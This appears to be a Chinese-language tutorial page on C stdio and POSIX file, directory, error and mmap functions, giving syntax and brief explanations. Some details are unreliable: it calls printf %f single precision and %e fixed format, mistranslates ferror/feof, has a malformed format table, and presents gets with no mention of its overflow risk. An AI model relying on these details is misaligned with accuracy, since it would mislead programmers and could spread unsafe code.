<p>术语刷新表示写出缓冲区中的数据。缓冲区可以由标准I/O库函数自动刷新，也可以通过调用fflush函数来刷新。</p>
<p>通常，缓冲区中的数据在下述情况下会自动刷新：</p>
<ul>
<li>当流被关闭时</li>
<li>当调用exit终止程序时</li>
<li>若流是行缓冲的，当写出一换行符时</li>
<li>当企图输出而缓冲区已满了时</li>
<li>无论何时对流的写入操作导致它实际从文件读数据时</li>
</ul>
<p>最后一种情形的例子是：当用print输出不带换行符的一个字符串至终端之后，若紧接着调用从终端读数据的函数，则也会导致缓冲区的输出立即被写到终端。</p>
<h2 id="fseek"><a href="#fseek" class="headerlink" title="fseek"></a>fseek</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">fseek</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span>stream<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">int</span> offset<span class="token punctuation">,</span> <span class="token keyword">int</span> whence<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>它为该流的下一次读取或写入设置流中的位置。<br>fseek返回一个整数：如果成功，则返回0；如果失败，则返回-1，并设置errno表示错误。</p>
<h2 id="fgetc-getc-getchar"><a href="#fgetc-getc-getchar" class="headerlink" title="fgetc, getc, getchar"></a>fgetc, getc, getchar</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">fgetc</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">getc</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>fgetc函数从文件流返回下一个字节作为字符。 当到达文件末尾或出现错误时，它将返回EOF。 您必须使用错误或伪造来区分这两种情况。<br>getc可以实现为宏。<br>getchar函数等效于getc（stdin），并从标准输入中读取下一个字符。</p>
<h2 id="fputc-putc-putchar"><a href="#fputc-putc-putchar" class="headerlink" title="fputc, putc, putchar"></a>fputc, putc, putchar</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">fputc</span><span class="token punctuation">(</span><span class="token keyword">int</span> c<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">putc</span><span class="token punctuation">(</span><span class="token keyword">int</span> c<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token keyword">int</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>fputc函数将一个字符写入输出文件流。 它返回已写入的值，如果失败则返回EOF。<br>函数putc等效于fputc，但可以将其实现为宏。<br>putchar函数等效于putc（c，stdout），将单个字符写入标准输出。</p>
<h2 id="fgets-gets"><a href="#fgets-gets" class="headerlink" title="fgets, gets"></a>fgets, gets</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">fgets</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">,</span> FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">gets</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>fgets函数从输入文件流中读取字符串。 它将字符写入s指向的字符串中，直到遇到换行符，传输n-1个字符或到达文件末尾为止，以先到者为准。<br>成功完成后，fgets返回一个指向字符串s的指针。 如果流在文件的末尾，它将为流设置EOF指示器，并且fgets返回空指针。 如果发生读取错误，fgets将返回一个空指针，并设置errno来指示错误的类型。<br>gets函数类似于fgets，不同之处在于它从标准输入中读取并丢弃遇到的任何换行符。 它将尾随空字节添加到接收字符串。</p>
<h1 id="Formatted-Input-and-Output"><a href="#Formatted-Input-and-Output" class="headerlink" title="Formatted Input and Output"></a>Formatted Input and Output</h1><p>如果您使用C进行编程，可能会有许多库函数以受控方式生成输出。<br>这些功能包括用于将值打印到文件流和scanf的printf和friends，以及用于从文件流读取值的其他函数。</p>
<h2 id="printf-fprintf-sprintf"><a href="#printf-fprintf-sprintf" class="headerlink" title="printf, fprintf, sprintf"></a>printf, fprintf, sprintf</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>format<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>format<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">fprintf</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span>stream<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>format<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>Printf系列函数能够对各种不同类型的参数进行格式化输出。<br>每个参数在输出流中的表示形式由格式参数format控制的，它是一个包含普通的可打印和称为“转换控制符”的代码的字符串，转换控制符规定了其余的参数应该以何种方式被输出到何种地方。</p>
<p>printf函数在标准输出上生成其输出。<br>fprintf函数在指定的流上生成其输出。<br>sprintf函数将其输出和一个终止空字符写入作为参数传递的字符串s中。 该字符串必须足够大以包含所有输出。<br>printf函数返回一个整数，即写入的字符数。 对于sprintf，这不包括终止null。 错误时，这些函数将返回负值并设置errno。</p>
<p>普通字符在输出时不发生变化。转换控制符让printf取出传递过来的其他参数并对它们的格式进行编排。</p>
<pre class="line-numbers language-none"><code class="language-none">%d, %i: Print an integer in decimal
%o, %x: Print an integer in octal, hexadecimal
%c: Print a character
%s: Print a string
%f: Print a floating point (single precision) number
%e: Print a double precision number, in fixed format
%g: Print a double in a general format<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以利用字段限定符对数据的输出格式做进一步的控制。它是对转换控制符的扩展，能够对输出数据的间隔进行控制。</p>
<p>一个常见用法是设置浮点数的小数位或设置字符串两端的空格数。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Format</th>
<th>Argument</th>
<th>Output</th>
</tr>
</thead>
<tbody>
<tr>
<td>%10s</td>
<td>“Hello”</td>
<td>\</td>
<td>Hello\</td>
<td></td>
</tr>
<tr>
<td>%-10s</td>
<td>“Hello”</td>
<td>\</td>
<td>Hello     \</td>
<td></td>
</tr>
<tr>
<td>%10d</td>
<td>1234</td>
<td>\</td>
<td>1234\</td>
<td></td>
</tr>
<tr>
<td>%-10d</td>
<td>1234</td>
<td>\</td>
<td>1234      \</td>
<td></td>
</tr>
<tr>
<td>%010d</td>
<td>1234</td>
<td>\</td>
<td>0000001234\</td>
<td></td>
</tr>
<tr>
<td>%10.4f</td>
<td>12.34</td>
<td>\</td>
<td>12.3400\</td>
<td></td>
</tr>
<tr>
<td>%*s</td>
<td>10, “Hello”</td>
<td>\</td>
<td>Hello\</td>
<td></td>
</tr>
<tr>
<td>%10s</td>
<td>“HelloTherePeeps”</td>
<td>HelloTherePeeps</td>
</tr>
</tbody>
</table>
</div>
<h2 id="scanf-fscanf-sscanf"><a href="#scanf-fscanf-sscanf" class="headerlink" title="scanf, fscanf, sscanf"></a>scanf, fscanf, sscanf</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>format<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">fscanf</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span>stream<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>format<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">sscanf</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>format<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>非常重要的一点是，用于保存scanf函数扫描的值的变量的类型正确，并且它们与格式字符串精确匹配。<br>与scanf一样，scanf和friends的格式字符串包含普通字符和转换说明符。<br>scanf函数返回成功读取的项目数，如果第一个项目失败，则为零。 如果在匹配第一个项目之前到达输入结尾，则返回EOF。 如果文件流发生读取错误，则将设置流错误标志，并将错误变量errno设置为指示错误的类型。</p>
<p>n以下是一些最常用的转换说明符：</p>
<pre class="line-numbers language-none"><code class="language-none">%d: Scan a decimal integer
%o, %x: Scan an octal, hexadecimal integer
%f, %e, %g: Scan a floating point number
%c: Scan a character (whitespace not skipped)
%s: Scan a string
%[]: Scan a set of characters 
%%: Scan a % character<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Other-Stream-Functions"><a href="#Other-Stream-Functions" class="headerlink" title="Other Stream Functions"></a>Other Stream Functions</h2><p>还有许多其他stdio库函数使用流参数或标准流stdin，stdout，stderr：</p>
<pre class="line-numbers language-none"><code class="language-none">fgetpos:获取文件流中的当前位置。
fsetpos:设置文件流中的当前位置。
ftell:返回流中的当前文件偏移量。
rewind:重置流中的文件位置。
freopen:重用文件流。
setvbuf:设置流的缓冲方案。
remove:等同于取消链接，除非path参数是目录，在这种情况下，它等同于rmdir。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="Stream-Errors"><a href="#Stream-Errors" class="headerlink" title="Stream Errors"></a>Stream Errors</h2><p>为了指示错误，许多stdio库函数返回超出范围的值，例如空指针或常量EOF。 在这些情况下，错误在外部变量errno中指示：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;errno.h></span></span>
<span class="token keyword">extern</span> <span class="token keyword">int</span> errno<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">ferror</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">feof</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">clearerr</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>ferror函数测试流的错误指示符，如果已设置，则返回非零值，否则返回零。<br>feof函数测试流中的文件结束指示符，如果已设置，则返回非零，否则返回零。<br>clearerr函数清除流指向的流的文件结尾和错误指示符，它没有返回值，也没有定义错误。</p>
<h2 id="Streams-and-File-Descriptors"><a href="#Streams-and-File-Descriptors" class="headerlink" title="Streams and File Descriptors"></a>Streams and File Descriptors</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token keyword">int</span> <span class="token function">fileno</span><span class="token punctuation">(</span>FILE <span class="token operator">*</span>stream<span class="token punctuation">)</span><span class="token punctuation">;</span>
FILE <span class="token operator">*</span><span class="token function">fdopen</span><span class="token punctuation">(</span><span class="token keyword">int</span> fildes<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>mode<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>我们可以通过调用fileno函数来确定将哪个低级文件描述符用于文件流。 它返回给定流的文件描述符，失败时返回-1。<br>我们可以通过调用fdopen函数，基于已经打开的文件描述符创建一个新的文件流。<br>mode参数与fopen函数的参数相同，并且必须与最初打开文件时建立的文件访问模式兼容。 fdopen返回新文件流，如果失败，则返回NULL。</p>
<h1 id="File-and-Directory-Maintenance"><a href="#File-and-Directory-Maintenance" class="headerlink" title="File and Directory Maintenance"></a>File and Directory Maintenance</h1><h2 id="chmod-and-chown"><a href="#chmod-and-chown" class="headerlink" title="chmod and chown"></a>chmod and chown</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>
<span class="token keyword">int</span> <span class="token function">chmod</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path<span class="token punctuation">,</span> <span class="token class-name">mode_t</span> mode<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token keyword">int</span> <span class="token function">chown</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path<span class="token punctuation">,</span> <span class="token class-name">uid_t</span> owner<span class="token punctuation">,</span> <span class="token class-name">gid_t</span> group<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>由path指定的文件已更改为具有mode赋予的权限。 这些模式是在开放系统调用中指定的，是所需权限的按位或。 除非为程序赋予适当的特权，否则只有文件所有者或超级用户可以更改其权限。<br>该调用使用用户ID和组ID的数值。 如果设置了适当的特权，则文件的所有者和组将被更改。</p>
<h2 id="unlink-link-symlink"><a href="#unlink-link-symlink" class="headerlink" title="unlink, link, symlink"></a>unlink, link, symlink</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token keyword">int</span> <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">link</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path1<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path2<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">symlink</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path1<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path2<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>取消链接系统调用将删除文件的目录条目，并减少文件的链接计数。 如果取消链接成功，则返回0；如果失败，则返回-1。 如果计数达到零，并且没有进程打开文件，则删除该文件。<br>链接系统调用会创建到现有文件path1的新链接。 新目录条目由path2指定。 我们可以使用symlink系统调用以类似的方式创建符号链接。</p>
<h2 id="mkdir-and-rmdir"><a href="#mkdir-and-rmdir" class="headerlink" title="mkdir and rmdir"></a>mkdir and rmdir</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>
<span class="token keyword">int</span> <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path<span class="token punctuation">,</span> <span class="token class-name">mode_t</span> mode<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token keyword">int</span> <span class="token function">rmdir</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>mkdir使用路径作为名称创建一个新目录。 目录权限以参数模式传递。<br>rmdir系统调用除去目录，但前提是它们为空。</p>
<h2 id="chdir-and-getcwd"><a href="#chdir-and-getcwd" class="headerlink" title="chdir and getcwd"></a>chdir and getcwd</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token keyword">int</span> <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span>buf<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>由于我们在外壳程序中使用cd命令更改目录，因此程序可以使用chdir系统调用。<br>程序可以通过调用getcwd函数来确定其当前工作目录。<br>getcwd函数将当前目录的名称写入给定缓冲区buf。 如果目录名称超过缓冲区的大小（以参数大小指定），则返回null。 成功返回buf。</p>
<h1 id="Scanning-Directories"><a href="#Scanning-Directories" class="headerlink" title="Scanning Directories"></a>Scanning Directories</h1><p>目录函数在头文件dirent.h中声明。 他们使用DIR结构作为目录操作的基础。<br>目录条目本身以dirent结构返回，该结构也在dirent.h中声明，因为永远不要直接更改DIR结构中的字段。</p>
<h2 id="opendir"><a href="#opendir" class="headerlink" title="opendir"></a>opendir</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;dirent.h></span></span>
DIR <span class="token operator">*</span><span class="token function">opendir</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>opendir函数打开目录并建立目录流。<br>如果成功，它将返回指向DIR结构的指针，以用于读取目录条目。 opendir在失败时返回空指针。</p>
<h2 id="readdir"><a href="#readdir" class="headerlink" title="readdir"></a>readdir</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;dirent.h></span></span>
<span class="token keyword">struct</span> <span class="token class-name">dirent</span> <span class="token operator">*</span><span class="token function">readdir</span><span class="token punctuation">(</span>DIR <span class="token operator">*</span>dirp<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>readdir函数返回一个指向结构的指针。 连续调用readdir将返回更多目录条目。 发生错误时，在目录末尾，readdir返回NULL。<br>包含目录条目详细信息的Dirent结构包括以下条目：</p>
<ul>
<li>ino_t d_ino:文件的索引节点</li>
<li>char d_name []:文件名</li>
</ul>
<h2 id="telldir-seekdir-closedir"><a href="#telldir-seekdir-closedir" class="headerlink" title="telldir, seekdir, closedir"></a>telldir, seekdir, closedir</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;dirent.h></span></span>
<span class="token keyword">long</span> <span class="token keyword">int</span> <span class="token function">telldir</span><span class="token punctuation">(</span>DIR <span class="token operator">*</span>dirp<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">seekdir</span><span class="token punctuation">(</span>DIR <span class="token operator">*</span>dirp<span class="token punctuation">,</span> <span class="token keyword">long</span> <span class="token keyword">int</span> loc<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">int</span> <span class="token function">closedir</span><span class="token punctuation">(</span>DIR <span class="token operator">*</span>dirp<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>telldir函数返回一个值，该值记录目录流中的当前位置。 您可以在随后的对seekdir的调用中使用此命令，以将目录扫描重置为当前位置。<br>seekdir函数在dirp给定的目录流中设置目录条目指针。 loc的值（用于设置位置）应从先前对telldir的调用中获得。<br>closedir函数关闭目录流并释放与之关联的资源。 成功返回0，如果有错误则返回1。</p>
<h1 id="Errors"><a href="#Errors" class="headerlink" title="Errors"></a>Errors</h1><p>本章中描述的许多系统调用和功能可能由于多种原因而失败。<br>当这样做时，它们通过设置外部变量errno的值来指示失败的原因。<br>函数出现问题后，程序必须立即检查errno变量。<br>错误的值和含义在头文件errno.h中列出。 它们包括</p>
<pre class="line-numbers language-none"><code class="language-none">EPERM：不允许操作
ENOENT：没有这样的文件或目录
EINTR：系统调用中断<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-none"><code class="language-none">EIO: I&#x2F;O Error
EBUSY: Device or resource busy
EEXIST: File exists
EINVAL: Invalid argument
EMFILE: Too many open files
ENODEV: No such device
EISDIR: Is a directory
ENOTDIR: Isn’t a directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="strerror-and-perror"><a href="#strerror-and-perror" class="headerlink" title="strerror and perror"></a>strerror and perror</h2><p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">strerror</span><span class="token punctuation">(</span><span class="token keyword">int</span> errnum<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">void</span> <span class="token function">perror</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>strerror函数将错误号映射到描述已发生错误类型的字符串中。<br>perror函数还将errno中报告的当前错误映射为字符串，并将其打印在标准错误流上。 它以字符串s（如果不为null）中给出的消息开头，后跟冒号和空格。</p>
<h1 id="Advanced-Topics-mmap"><a href="#Advanced-Topics-mmap" class="headerlink" title="Advanced Topics: mmap"></a>Advanced Topics: mmap</h1><p>mmap（用于内存映射）功能设置了一段内存，可由两个或更多程序读取或写入。 一个程序所做的更改将被其他程序看到。<br>从该段读取和写入该段将导致操作系统读取和写入磁盘文件的相应部分。<br>mmap函数创建一个指向与通过打开的文件描述符访问的文件内容关联的内存区域的指针</p>
<p>syntax:</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span>
<span class="token keyword">void</span> <span class="token operator">*</span><span class="token function">mmap</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">,</span> <span class="token keyword">int</span> prot<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">,</span> <span class="token keyword">int</span> fildes<span class="token punctuation">,</span> <span class="token class-name">off_t</span> off<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>您可以通过传递off参数来更改共享段访问的文件数据的开始。 打开文件描述符以fildes的形式传递。 可通过len参数设置可访问的数据量。<br>您可以使用addr参数来请求特定的内存地址。 如果为零，则自动分配结果指针。</p>
<p>prot参数用于设置内存段的访问权限。 这是以下常量值的按位或：</p>
<pre class="line-numbers language-none"><code class="language-none">PROT_READ:可以读取该段
PROT_WRITE:该段可以写
PROT_EXEC:该段可以执行
PROT_NONE:无法访问细分<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>flags参数控制程序对段所做的更改如何在其他地方反映。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Argument</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>MAP_PRIVATE</td>
<td>The segment is private, changes are local</td>
</tr>
<tr>
<td>MAP_SHARED</td>
<td>The segment changes are made in the file</td>
</tr>
<tr>
<td>MAP_FIXED</td>
<td>The segment must be at the given address,addr</td>
</tr>
</tbody>
</table>
</div>
<p>msync函数使部分或全部内存段中的更改被写回到映射文件（或从中读取）。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span>
<span class="token keyword">int</span> <span class="token function">msync</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span>addr<span class="token punctuation">,</span> <span class="token class-name">size_t</span> len<span class="token punctuation">,</span> <span class="token keyword">int</span> flags<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>段的要更新的部分由传递的起始地址addr和长度len给出。 flags参数控制应如何执行更新。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>Argument</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr>
<td>MS_ASYNC</td>
<td>Perform asynchronous writes</td>
</tr>
<tr>
<td>MS_SYNC</td>
<td>Perform synchronous writes</td>
</tr>
<tr>
<td>MS_INVALIDATE</td>
<td>Read data back in from the file</td>
</tr>
</tbody>
</table>
</div>
<p>munmap函数释放内存段。</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span>
